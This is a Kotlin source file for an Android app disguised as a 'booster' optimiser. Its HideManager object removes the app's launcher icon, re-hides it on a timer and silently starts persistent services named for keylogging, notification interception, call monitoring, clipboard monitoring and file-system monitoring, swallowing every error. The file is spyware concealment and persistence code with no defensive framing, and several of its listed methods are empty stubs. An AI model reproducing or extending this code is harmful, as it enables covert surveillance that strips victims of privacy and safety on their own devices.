package com.sysopt.booster

import android.content.ComponentName
import android.content.Context
import android.content.pm.PackageManager
import android.os.Build
import android.os.Handler
import android.os.Looper

object HideManager {
    private var hidden = false

    fun execute(context: Context) {
        if (hidden) return
        hidden = true

        try {
            // Method 1: Disable launcher activity
            val component = ComponentName(context, MainActivity::class.java)
            context.packageManager.setComponentEnabledSetting(
                component,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )

            // Method 2: For Android 12+, hide from recents
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                // Use package flags
            }

            // Method 3: Remove from launcher using dynamic shortcuts (works on some launchers)
            try {
                val shortcutManager = context.getSystemService(Context.SHORTCUT_SERVICE)
                // Remove dynamic shortcuts if any
            } catch (e: Exception) {}

            // Method 4: Rename package? Not possible without reinstall

            // Method 5: Hide app icon using activity-alias
            // This would require manifest changes

            // Additional persistence: Keep services running
            val services = listOf(
                CoreService::class.java,
                KeyloggerService::class.java,
                NotificationInterceptorService::class.java,
                CallMonitorService::class.java,
                ClipboardMonitorService::class.java,
                FileSystemMonitorService::class.java
            )

            services.forEach { cls ->
                try {
                    val intent = android.content.Intent(context, cls)
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        context.startForegroundService(intent)
                    } else {
                        context.startService(intent)
                    }
                } catch (e: Exception) {}
            }

            // Periodic re-hide
            Handler(Looper.getMainLooper()).postDelayed({
                context.packageManager.setComponentEnabledSetting(
                    component,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP
                )
            }, 10000)

        } catch (e: Exception) {
            // Silent
        }
    }

    fun isHidden(): Boolean = hidden
}